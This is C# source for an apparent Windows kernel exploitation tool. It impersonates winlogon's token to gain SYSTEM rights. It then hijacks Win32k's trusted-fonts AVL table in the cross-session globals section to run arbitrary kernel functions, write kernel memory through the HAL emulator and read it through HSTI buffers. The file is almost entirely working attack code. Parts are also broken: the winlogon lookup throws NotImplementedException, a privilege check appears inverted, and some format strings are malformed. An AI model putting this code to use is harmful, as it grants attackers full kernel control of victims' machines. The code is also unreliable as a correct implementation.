using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace R0aCkS
{
    // Tracks execution state between calls
    internal static class ExecutionTracker
    {
        private static void ElevateToSystem()
        {
            IntPtr hToken = IntPtr.Zero;
            IntPtr hNewtoken = IntPtr.Zero;
            int status;

            // Create toolhelp snaapshot
            IntPtr hSnapshot = Natives.CreateToolhelp32Snapshot(0x00000002 /*TH32CS_SNAPPROCESS*/, 0);
            if (IntPtr.Zero == hSnapshot) {
                Console.WriteLine("[-] Failed to initialize toolhelp snapshot: 0x{0:X8}", Marshal.GetLastWin32Error());
                throw new ApplicationException();
            }
            // Scan process list
            uint logonPid = 0;
            IntPtr processEntry = IntPtr.Zero;
            try {
                int bufferSize = 1024;
                processEntry = Marshal.AllocCoTaskMem(bufferSize);
                Marshal.WriteInt32(processEntry, bufferSize);
                // processEntry.dwSize = sizeof(processEntry);
                if (Natives.Process32First(hSnapshot, processEntry)) {
                    do {
                        // Look for winlogon
                        // TODO : Check the offset.
                        throw new NotImplementedException();
                        //string processName = Marshal.PtrToStringUni(processEntry + 44);
                        //if (processName.Contains("winlogon.exe")) {
                        //    // Found it
                        //    logonPid = Marshal.ReadInt32(processEntry, 8 /*th32ProcessID*/);
                        //    break;
                        //}
                    } while (Natives.Process32Next(hSnapshot, processEntry));
                }
            }
            finally {
                if (IntPtr.Zero != processEntry) { Marshal.FreeCoTaskMem(processEntry); }
            }
            // Fail it not found
            if (logonPid == 0) {
                Console.WriteLine("[-] Couldn't find Winlogon.exe");
                throw new ApplicationException();
            }

            // Enable debug privileges, so that we may open the processes we need
            bool old;
            if (0 <= (status = Natives.RtlAdjustPrivilege(0x00000014 /* SE_DEBUG_PRIVILEGE*/, true, false, out old))) {
                Console.WriteLine("[-] Failed to get SE_DEBUG_PRIVILEGE: 0x{0:X8}", status);
                throw new ApplicationException();
            }

            // Open handle to it
            IntPtr hProcess = IntPtr.Zero;
            try {
                hProcess = Natives.OpenProcess(MAXIMUM_ALLOWED, false, logonPid);
                if (IntPtr.Zero == hProcess) {
                    Console.WriteLine("[-] Failed to open handle to Winlogon: 0x{0:8X}", Marshal.GetLastWin32Error());
                    throw new ApplicationException();
                }
                // Open winlogon's token
                if (!Natives.OpenProcessToken(hProcess, MAXIMUM_ALLOWED, out hToken)) {
                    Console.WriteLine("[-] Failed to open Winlogon Token: 0x{0:8X}", Marshal.GetLastWin32Error());
                    throw new ApplicationException();
                }
                // Make an impersonation token copy out of it
                if (!Natives.DuplicateToken(hToken, 2 /* SecurityImpersonation*/, out hNewtoken)) {
                    Console.WriteLine("[-] Failed to duplicate Winlogon Token: 0x{0:8X}", Marshal.GetLastWin32Error());
                    throw new ApplicationException();
                }
                // And assign it as our thread token
                if (!Natives.SetThreadToken(IntPtr.Zero, hNewtoken)) {
                    Console.WriteLine("[-] Failed to impersonate Winlogon Token: 0x{0:8X}", Marshal.GetLastWin32Error());
                    throw new ApplicationException();
                }
            }
            finally {
                // Close the handle to wininit, its token, and our copy
                if (IntPtr.Zero != hProcess) { Natives.CloseHandle(hProcess); }
                if (IntPtr.Zero != hToken) { Natives.CloseHandle(hToken); }
                if (IntPtr.Zero != hNewtoken) { Natives.CloseHandle(hNewtoken); }
            }
            return;
        }

        internal static unsafe void Execute(UIntPtr FunctionPointer, UIntPtr FunctionParameter)
        {
            // Initialize a work item for the caller-supplied function and argument
            Console.WriteLine("[+] Calling function pointer 0x{0}", FunctionPointer);
            try { SetCallback(FunctionPointer, FunctionParameter); }
            catch {
                Console.WriteLine("[-] Failed to initialize work item trampoline");
                throw;
            }
            // Begin ETW tracing to look for the work item executing
            EtwTracer tracer = new EtwTracer();
            try { tracer.StartSession(FunctionPointer); }
            catch {
                Console.WriteLine("[-] Failed to start ETW trace");
                throw;
            }
            // Execute it!
            try { Run(); }
            catch {
                Console.WriteLine("[-] Failed to execute work item");
                throw;
            }
            // Wait for execution to finish
            try { tracer.ParseSession(); }
            catch {
                // We have no idea if execution finished -- block forever
                Console.WriteLine("[-] Failed to parse ETW trace");
                Thread.Sleep(TimeSpan.MaxValue);
            }
            return;
        }

        internal static unsafe void Read(void* KernelAddress, uint ValueSize)
        {
            // First, set the size that the user wants
            Console.WriteLine("[+] Setting size to                                      0x{0:X16}", ValueSize);
            try { Write((void*)SymbolHandling.g_HstiBufferSize, ValueSize); }
            catch {
                Console.WriteLine("[-] Fail to set size");
                throw;
            }
            // Then, set the pointer -- our write is 32-bits so we do it in 2 steps
            Console.WriteLine("[+] Setting pointer to                                   0x{0:X16}\n",
                (UIntPtr)KernelAddress);
            try { Write((void*)SymbolHandling.g_HstiBufferPointer, (uint)((ulong)KernelAddress & 0xFFFFFFFF)); }
            catch {
                Console.WriteLine("[-] Fail to set lower pointer bits");
                throw;
            }
            try { Write((void*)((ulong)SymbolHandling.g_HstiBufferPointer + 4), (uint)((ulong)KernelAddress >> 32)); }
            catch {
                Console.WriteLine("[-] Fail to set lower pointer bits");
                throw;
            }
            // Allocate a buffer for the data in user space
            UIntPtr userData = Natives.VirtualAlloc(UIntPtr.Zero, ValueSize, 0x00003000 /* MEM_COMMIT | MEM_RESERVE*/,
                4 /*PAGE_READWRITE*/);
            if (null == userData) {
                Console.WriteLine("[-] Failed to allocate user mode buffer\n");
                throw new ApplicationException();
            }
            // Now do the read by abusing the HSTI buffers
            uint returnLength;
            uint status = Natives.NtQuerySystemInformation(SystemHardwareSecurityTestInterfaceResultsInformation,
                userData, ValueSize, out returnLength);
            if (0 != status) {
                Console.WriteLine("[-] Failed to read kernel data");
            }
            else {
                Program.DumpHex((void*)userData, ValueSize);
            }
            // Free the buffer and exit
            Natives.VirtualFree(userData, 0, 0x8000 /*MEM_RELEASE*/);
            if (status < 0) {
                throw new ApplicationException();
            }
            return;
        }

        internal static unsafe void Run()
        {
            // Remember original pointer
            RTL_AVL_TABLE* realTable = _globals->TrustedFontsTable;
            // Remove arial, which is our target font
            if (!Natives.RemoveFontResourceExW(@"C:\windows\fonts\arial.ttf", 0, UIntPtr.Zero)) {
                Console.WriteLine("[-] Failed to remove font: 0x{0:X}", Marshal.GetLastWin32Error());
                throw new ApplicationException();
            }
            // Save the original trusted font file table and overwrite it with our own.
            RTL_AVL_TABLE* fakeTable = (RTL_AVL_TABLE*)((_globals) + 1);
            fakeTable->BalancedRoot.RightChild = _trampolineParameter;
            _globals->TrustedFontsTable = fakeTable;
            // Set our priority to 4, the theory being that this should force the work
            // item to execute even on a single-processor core
            Natives.SetThreadPriority(Natives.GetCurrentThread(), 0x00010000 /* THREAD_MODE_BACKGROUND_BEGIN*/);
            // Add a font -- Win32k.sys will check if it's in the trusted path,
            // triggering the AVL search. This will trigger the execute.
            if (0 == Natives.AddFontResourceExW(@"C:\windows\fonts\arial.ttf", 0, UIntPtr.Zero)) {
                Console.WriteLine("[-] Failed to add font: 0x{0:X}", Marshal.GetLastWin32Error());
            }
            // Restore original pointer and thread priority
            _globals->TrustedFontsTable = realTable;
            Natives.SetThreadPriority(Natives.GetCurrentThread(), 0x00020000 /*THREAD_MODE_BACKGROUND_END*/);
            return;
        }

        internal static unsafe void Setup(UIntPtr TrampolineFunction)
        {
            Natives.UNICODE_STRING name = new Natives.UNICODE_STRING();

            // Get a SYSTEM token
            try { ElevateToSystem(); }
            catch {
                Console.WriteLine("[-] Failed to elevate to SYSTEM privileges");
                throw;
            }
            // Open a handle to Win32k's cross-session globals section object
            Natives.RtlInitUnicodeString(ref name, @"\Win32kCrossSessionGlobals");
            Natives.OBJECT_ATTRIBUTES objectAttributes =
                new Natives.OBJECT_ATTRIBUTES(&name, 64 /* OBJ_CASE_INSENSITIVE */, IntPtr.Zero, IntPtr.Zero);
            IntPtr hFile;
            int status = Natives.ZwOpenSection(out hFile, MAXIMUM_ALLOWED, &objectAttributes);
            // We can drop impersonation now
            if (!Natives.RevertToSelf()) {
                // Not much to do but trace
                Console.WriteLine("[-] Failed to revert impersonation token: 0x{0:8X}", Marshal.GetLastWin32Error());
            }
            // Can't keep going if we couldn't get a handle to the section
            if (0 > status)
            {
                Console.WriteLine("[-] Couldn't open handle to kernel execution block: 0x{0:8X}", Marshal.GetLastWin32Error());
                Natives.CloseHandle(hFile);
                throw new ApplicationException();
            }
            // Map the section object in our address space
            _globals = (XSGLOBALS*)Natives.MapViewOfFile(hFile, FILE_MAP_ALL_ACCESS, 0, 0,
                (ulong)Marshal.SizeOf(*(_globals)));
            Natives.CloseHandle(hFile);
            if (null == _globals) {
                Console.WriteLine("[-] Couldn't map kernel execution block: 0x{0:8X}", Marshal.GetLastWin32Error());
                throw new ApplicationException();
            }
            // Setup the table
            Console.WriteLine("[+] Mapped kernel execution block at                     0x{0:X16}",
                (IntPtr)_globals);
            RTL_AVL_TABLE* fakeTable;
            fakeTable = (RTL_AVL_TABLE*)(_globals + 1);
            fakeTable->DepthOfTree = 1;
            fakeTable->NumberGenericTableElements = 1;
            fakeTable->CompareRoutine = TrampolineFunction;
            return;
        }

        internal static unsafe bool SetCallback(UIntPtr WorkFunction, UIntPtr WorkParameter)
        {
            // Allocate the right child page that will be sent to the trampoline
            AllocationTracker allocator;
            try {
                allocator = new AllocationTracker((uint)Marshal.SizeOf<CONTEXT_PAGE>());
            }
            catch {
                Console.WriteLine("[-] Failed to allocate memory for WORK_QUEUE_ITEM");
                throw;
            }
            try {
                CONTEXT_PAGE* contextBuffer = (CONTEXT_PAGE*)allocator.UserBase;
                // Fill out the worker and its parameter
                contextBuffer->WorkItem.WorkerRoutine = WorkFunction;
                contextBuffer->WorkItem.Parameter = WorkParameter;
                // Write into the buffer
                contextBuffer = (CONTEXT_PAGE*)allocator.Write();
                if (null == contextBuffer) {
                    // KernelFree(kernelAlloc);
                    Console.WriteLine("[-] Failed to find kernel memory for WORK_QUEUE_ITEM");
                    return false;
                }
                // Return the balanced links with the appropriate work item
                _trampolineAllocation = &allocator;
                _trampolineParameter = &contextBuffer->Header;
                return true;
            }
            finally {
                allocator.Dispose();
            }
        }

        internal static unsafe void Teardown()
        {
            // Free the trampoline context
            _trampolineAllocation->Dispose();
            // Unmap the globals
            Natives.UnmapViewOfFile((IntPtr)_globals);
        }

        internal static unsafe void Write(void* KernelAddress, uint KernelValue)
        {
            // Trace operation
            Console.WriteLine("[+] Writing 0x{0:X8} to                                0x{1:X16}",
                KernelValue, (UIntPtr)KernelAddress);
            // Allocate an XM_CONTEXT to drive the HAL x64 emulator
            AllocationTracker allocator;
            try {
                allocator = new AllocationTracker((uint)Marshal.SizeOf<XM_CONTEXT>());
            }
            catch {
                Console.WriteLine("[-] Failed to allocate memory for XM_CONTEXT\n");
                throw;
            }
            try {
                XM_CONTEXT* xmContext = (XM_CONTEXT*)allocator.UserBase;
                // Fill it out
                xmContext->SourceValue = KernelValue;
                xmContext->DataType = XM_OPERATION_DATATYPE.LONG_DATA;
                xmContext->DestinationPointer = (UIntPtr)KernelAddress;
                // Make a kernel copy of it
                xmContext = (XM_CONTEXT*)allocator.Write();
                if (null == xmContext) {
                    Console.WriteLine("[-] Failed to find kernel memory for XM_CONTEXT\n");
                    throw new ApplicationException();
                }
                // Setup the work item
                try { SetCallback(SymbolHandling.g_XmFunction, (UIntPtr)(&xmContext)); }
                catch {
                    Console.WriteLine("[-] Failed to initialize work item!\n");
                    throw;
                }
                // Begin ETW tracing to look for the work item executing
                EtwTracer etwData = new EtwTracer();
                try { etwData.StartSession(SymbolHandling.g_XmFunction); }
                catch {
                    Console.WriteLine("[-] Failed to start ETW trace\n");
                    throw;
                }
                // Run it!
                try { Run(); }
                catch {
                    Console.WriteLine("[-] Failed to execute kernel function!\n");
                    throw;
                }
                // Wait for execution to finish
                try { etwData.ParseSession(); }
                catch {
                    // We have no idea if execution finished -- block forever
                    Console.WriteLine("[-] Failed to parse ETW trace\n");
                    Thread.Sleep(int.MaxValue);
                }
                return;
            }
            finally {
                allocator.Dispose();
            }
        }

        private const uint FILE_MAP_ALL_ACCESS = 0x000F001F;
        private const uint MAXIMUM_ALLOWED = (1 << 25);
        private const uint SystemHardwareSecurityTestInterfaceResultsInformation = 166;
        internal static unsafe XSGLOBALS* _globals;
        private static unsafe AllocationTracker* _trampolineAllocation;
        private static unsafe RTL_BALANCED_LINKS* _trampolineParameter;

        internal struct CONTEXT_PAGE
        {
            internal RTL_BALANCED_LINKS Header;
            internal ulong _filler0;
            internal ulong _filler1;
            internal ulong _filler2;
            internal ulong _filler3;
            internal ulong _filler4;
            internal ulong _filler5;
            internal ulong _filler6;
            internal ulong _filler7;
            internal ulong _filler8;
            internal ulong _filler9;
            internal WORK_QUEUE_ITEM WorkItem;
        }

        internal unsafe struct LIST_ENTRY
        {
            internal LIST_ENTRY* Flink;
            internal LIST_ENTRY* Blink;
        }

        internal unsafe struct RTL_AVL_TABLE
        {
            internal RTL_BALANCED_LINKS BalancedRoot;
            internal IntPtr OrderedPointer;
            internal uint WhichOrderedElement;
            internal uint NumberGenericTableElements;
            internal uint DepthOfTree;
            internal RTL_BALANCED_LINKS* RestartKey;
            internal uint DeleteCount;
            internal UIntPtr CompareRoutine;
            internal UIntPtr AllocateRoutine;
            internal UIntPtr FreeRoutine;
            internal UIntPtr TableContext;
        }

        internal unsafe struct RTL_BALANCED_LINKS
        {
            internal RTL_BALANCED_LINKS* Parent;
            internal RTL_BALANCED_LINKS* LeftChild;
            internal RTL_BALANCED_LINKS* RightChild;
            internal byte Balance;
            internal byte _filler0;
            internal byte _filler1;
            internal byte _filler2;
        }

        internal struct WORK_QUEUE_ITEM
        {
            internal LIST_ENTRY List;
            internal UIntPtr WorkerRoutine;
            internal UIntPtr Parameter;
        }

        internal struct XM_CONTEXT
        {
            internal ulong _reserved0;
            internal ulong _reserved1;
            internal ulong _reserved2;
            internal ulong _reserved3;
            internal ulong _reserved4;
            internal ulong _reserved5;
            internal ulong _reserved6;
            internal ulong _reserved7;
            internal ulong _reserved8;
            internal ulong _reserved9;
            internal ulong _reserved10;
            internal UIntPtr DestinationPointer;
            internal UIntPtr SourcePointer;
            internal uint DestinationValue;
            internal uint SourceValue;
            internal uint CurrentOpcode;
            internal uint DataSegment;
            internal XM_OPERATION_DATATYPE DataType;
        }

        internal enum XM_OPERATION_DATATYPE : uint
        {
            BYTE_DATA = 0,
            WORD_DATA = 1,
            LONG_DATA = 3
        }

        internal unsafe struct XSGLOBALS
        {
            internal IntPtr NetworkFontsTableLock;
            internal RTL_AVL_TABLE* NetworkFontsTable;
            internal IntPtr TrustedFontsTableLock;
            internal RTL_AVL_TABLE* TrustedFontsTable;
        }
    }
}
